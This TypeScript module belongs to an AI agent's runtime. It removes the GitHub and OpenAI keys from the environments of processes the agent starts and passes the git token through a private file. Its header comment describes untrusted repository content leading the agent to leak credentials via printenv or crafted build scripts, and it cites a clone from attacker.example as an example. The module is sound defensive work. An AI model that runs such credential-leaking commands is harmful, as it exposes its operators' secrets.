/**
 * Environment handed to the processes the agent starts.
 *
 * Layer: domain.
 *
 * The container environment carries the GitHub PAT and the OpenAI key because that is the only
 * channel the worker has for them. Anything the agent runs must not inherit either: the model
 * chooses those commands after reading untrusted repository content, and `printenv` or a crafted
 * build script would otherwise hand a credential straight back through tool output.
 *
 * Git still needs the token, so it is written to a private file on the container's tmpfs and named
 * to `askpass.sh` through `AH_GIT_TOKEN_FILE`. The helper releases it only for the approved host
 * over https, so a `git clone https://attacker.example/x` inside the workspace gets nothing.
 */
import { chmod, mkdir, rm, writeFile } from 'node:fs/promises';
import path from 'node:path';

/** Location of the askpass helper inside the workspace image. */
export const DEFAULT_ASKPASS = '/opt/agent-runtime/askpass.sh';

/** Variables removed from every child environment. */
export const SCRUBBED_KEYS = ['GITHUB_TOKEN', 'OPENAI_API_KEY'] as const;

/** Name of the token file inside the runtime's private directory. */
const TOKEN_FILE_NAME = 'git-token';

/** Owner-only directory permissions. */
const PRIVATE_DIRECTORY_MODE = 0o700;

/** Owner-only file permissions. */
const PRIVATE_FILE_MODE = 0o600;

const SCRUBBED = new Set<string>(SCRUBBED_KEYS);

/** Options of {@link createChildEnv}. */
export interface ChildEnvOptions {
  /** Path of the git token file, when one was materialised. */
  tokenFile?: string | null;
}

/**
 * Builds the environment for a process the agent starts.
 *
 * @param parent - The runtime's own environment.
 * @param options - Token file to advertise to the askpass helper.
 * @returns A fresh environment with the credentials removed and git wired for non-interactive use.
 */
export function createChildEnv(
  parent: Readonly<Record<string, string | undefined>>,
  options: ChildEnvOptions = {},
): Record<string, string> {
  const child: Record<string, string> = {};
  for (const [key, value] of Object.entries(parent)) {
    if (value !== undefined && !SCRUBBED.has(key)) {
      child[key] = value;
    }
  }
  // Without this, a git command that needs credentials blocks on a terminal prompt that no one
  // will ever answer, and the tool call runs until its timeout.
  child.GIT_TERMINAL_PROMPT = '0';
  const inheritedAskpass = parent.GIT_ASKPASS;
  child.GIT_ASKPASS =
    inheritedAskpass === undefined || inheritedAskpass === '' ? DEFAULT_ASKPASS : inheritedAskpass;
  if (options.tokenFile !== undefined && options.tokenFile !== null) {
    child.AH_GIT_TOKEN_FILE = options.tokenFile;
  }
  return child;
}

/**
 * Writes the GitHub token to a private file so the askpass helper can read it without the token
 * being present in any child environment.
 *
 * @param parent - The runtime's own environment.
 * @param directory - Private directory to hold the file; created if missing.
 * @returns The file path, or `null` when no token is configured.
 */
export async function materializeGitToken(
  parent: Readonly<Record<string, string | undefined>>,
  directory: string,
): Promise<string | null> {
  const token = parent.GITHUB_TOKEN;
  if (token === undefined || token === '') {
    return null;
  }
  await mkdir(directory, { recursive: true, mode: PRIVATE_DIRECTORY_MODE });
  const file = path.join(directory, TOKEN_FILE_NAME);
  await writeFile(file, token, { mode: PRIVATE_FILE_MODE });
  // The mode passed to `mkdir`/`writeFile` is masked by the process umask, so it is reapplied:
  // a group- or world-readable token file would defeat the point of moving it out of the
  // environment in the first place.
  await chmod(directory, PRIVATE_DIRECTORY_MODE);
  await chmod(file, PRIVATE_FILE_MODE);
  return file;
}

/**
 * Removes the token file at the end of a turn.
 *
 * @param file - Path returned by {@link materializeGitToken}, or `null` when none was written.
 */
export async function removeGitToken(file: string | null): Promise<void> {
  if (file === null) {
    return;
  }
  await rm(file, { force: true });
}
